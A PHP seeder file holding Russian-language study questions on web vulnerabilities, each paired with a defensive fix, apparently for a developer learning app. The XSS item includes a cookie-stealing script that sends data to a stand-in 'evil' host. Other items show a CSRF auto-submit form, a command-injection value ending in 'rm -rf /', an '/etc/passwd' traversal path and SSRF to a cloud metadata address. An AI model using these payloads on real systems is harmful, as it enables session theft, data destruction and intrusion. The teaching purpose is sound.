<?php

namespace Database\Seeders\Data\Categories\Security;

class WebAttacks
{
    public static function all(): array
    {
        return [
            [
                'category' => 'Безопасность',
                'question' => 'Что такое SQL-инъекция простыми словами?',
                'answer' => 'Атакующий вставляет SQL-код в пользовательский ввод, который попадает в запрос как часть SQL, а не как данные. Если склеить "SELECT * FROM users WHERE id = " . \$_GET[\'id\'] и пользователь введёт «1 OR 1=1» — вернётся вся таблица. Защита — prepared statements: значения передаются ОТДЕЛЬНО от шаблона запроса.',
                'code_example' => "<?php
// ПЛОХО — конкатенация ввода
\$sql = \"SELECT * FROM users WHERE id = \" . \$_GET['id'];

// ХОРОШО — prepared statement, PDO
\$stmt = \$pdo->prepare('SELECT * FROM users WHERE id = ?');
\$stmt->execute([\$_GET['id']]);
\$user = \$stmt->fetch();

// В Laravel — Eloquent сам биндит
User::where('id', \$request->id)->first();",
                'code_language' => 'php',
                'difficulty' => 1,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое XSS простыми словами?',
                'answer' => 'Cross-Site Scripting — атакующий вставляет JS-код в твой HTML через пользовательский ввод. Пример: в комментарии написал <script> со сбором куки — у всех, кто откроет страницу, скрипт украдёт куки и отправит атакующему. Защита — экранирование вывода: htmlspecialchars() в чистом PHP или {{ $var }} в Blade (он экранирует автоматически, {!! !!} — НЕ экранирует).',
                'code_example' => "<!-- Пользователь сохранил в комментарий: -->
<script>fetch('https://evil/?c='+document.cookie)</script>

<!-- ПЛОХО — вывели как есть, скрипт выполнится у каждого -->
<div><?= \$comment ?></div>

<!-- ХОРОШО — экранирование, теги станут текстом -->
<div><?= htmlspecialchars(\$comment, ENT_QUOTES, 'UTF-8') ?></div>

<!-- В Blade — экранирование по умолчанию -->
<div>{{ \$comment }}</div>",
                'code_language' => 'html',
                'difficulty' => 1,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Какие виды XSS бывают?',
                'answer' => '1) Stored (persistent) — вредоносный код сохраняется в БД (комментарий, профиль) и показывается всем посетителям. 2) Reflected — код в URL/параметре, исполняется один раз на странице, открытой через подложенную ссылку. 3) DOM-based — атака чисто на клиенте через манипуляцию DOM-ом (innerHTML с пользовательскими данными) без участия сервера.',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое CSP и как он помогает от XSS?',
                'answer' => 'Content Security Policy — HTTP-заголовок, который говорит браузеру: «загружай скрипты/стили/изображения только с этих источников». Если XSS прошёл, но политика запрещает inline-скрипты и внешние домены, эксплойт не сработает — браузер просто не выполнит чужой JS. Пример: Content-Security-Policy: default-src \'self\'; script-src \'self\'.',
                'difficulty' => 3,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое CSRF простыми словами?',
                'answer' => 'Cross-Site Request Forgery — атакующий заставляет залогиненного пользователя выполнить действие на твоём сайте без его ведома. Жертва открывает сайт атакующего, тот сабмитит скрытую форму POST на твой сайт — браузер автоматически прикладывает куки сессии, и действие выполняется от имени жертвы. Защита: CSRF-токен в форме (сервер сверяет с тем, что в сессии) и SameSite=Lax/Strict у куки. В Laravel — @csrf в Blade-форме автоматически.',
                'code_example' => "<!-- Злоумышленник у себя на сайте: -->
<form action=\"https://your-site.test/account/delete\" method=\"POST\">
  <input name=\"confirm\" value=\"yes\">
</form>
<script>document.forms[0].submit()</script>

<!-- Защита в Blade — токен ставится автоматически -->
<form method=\"POST\" action=\"/account/delete\">
  @csrf
  <button>Удалить</button>
</form>",
                'code_language' => 'html',
                'difficulty' => 1,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое SSRF простыми словами?',
                'answer' => 'Server-Side Request Forgery — атакующий заставляет твой сервер послать запрос куда ему нужно. Пример: на твоём сайте есть «предпросмотр URL», пользователь даёт http://localhost:6379/ — сервер из своей сети дёргает внутренний Redis. Особенно опасно в облаках — доступ к metadata-эндпоинту (169.254.169.254) даёт IAM-токены. Защита: whitelist разрешённых доменов, блок 127.0.0.1 и приватных IP.',
                'difficulty' => 3,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое clickjacking простыми словами?',
                'answer' => 'Атака, при которой твой сайт встраивается в <iframe> на сайте атакующего, тот накладывает поверх свои элементы. Пользователь думает, что кликает на кнопку «Скачать», а на самом деле — на «Удалить аккаунт» в твоём сайте. Защита: заголовок X-Frame-Options: DENY или CSP frame-ancestors \'none\'.',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое path traversal простыми словами?',
                'answer' => 'Атакующий через user-input выходит за пределы разрешённой папки. Пример: file_get_contents("uploads/" . $_GET[\'file\']) + ввод ../../../etc/passwd. Защита: basename() входа, проверка realpath()-результата на префикс разрешённой директории, whitelist разрешённых имён файлов.',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое command injection простыми словами?',
                'answer' => 'Атакующий передаёт shell-команду через пользовательский ввод в exec/shell_exec/system/passthru. Пример: shell_exec("ping " . $_GET[\'host\']) + ввод «8.8.8.8; rm -rf /» — выполнятся обе команды. Защита: по возможности не вызывать shell вообще, использовать готовые библиотеки. Если без shell никак — escapeshellarg() на каждом аргументе и whitelist разрешённых значений.',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое mass assignment простыми словами?',
                'answer' => 'Уязвимость, когда фреймворк автоматически проставляет в модель все поля из запроса. Атакующий шлёт лишнее поле — например, role=admin или is_verified=1 — и через User::create($request->all()) оно сохраняется. Защита в Laravel: $fillable (whitelist полей, которые можно массово назначать) или $guarded, явный $request->only([\'name\', \'email\']) перед сохранением.',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое open redirect простыми словами?',
                'answer' => 'Сервер делает редирект на URL из пользовательского параметра без проверки. /login?redirect=https://phishing.example — после логина пользователя выкидывает на фишинговый сайт, который выглядит как твой. Используется в фишинге — ссылка идёт с твоего домена, выглядит «доверенно». Защита: редирект только на относительные пути или whitelist доменов.',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Какие риски при загрузке файлов от пользователей и как защититься?',
                'answer' => 'Риски: 1) Загрузка PHP-файла в публичную папку → RCE при обращении к нему. 2) Загрузка XSS в svg/html. 3) Подделка Content-Type. 4) Zip-bomb / огромные файлы. 5) Path traversal в имени файла. Защита: whitelist расширений по реальному содержимому (mime_content_type, finfo), хранение вне webroot или в S3, выдача через контроллер, лимит размера, генерация нового имени (не доверять пользовательскому), запрет выполнения PHP в папке загрузок.',
                'difficulty' => 3,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое MITM (Man-in-the-Middle) простыми словами?',
                'answer' => 'Атакующий встаёт между клиентом и сервером и видит/меняет трафик. Классический сценарий — публичный Wi-Fi с поддельной точкой. По HTTP всё в открытом виде — пароли, куки, токены. По HTTPS защищает TLS: трафик шифруется, а сертификат подтверждает, что ты говоришь именно с example.com, а не с прокси. Защита: HTTPS везде, HSTS-заголовок (браузер откажется ходить по HTTP на этот домен), certificate pinning для мобильных приложений.',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
        ];
    }
}
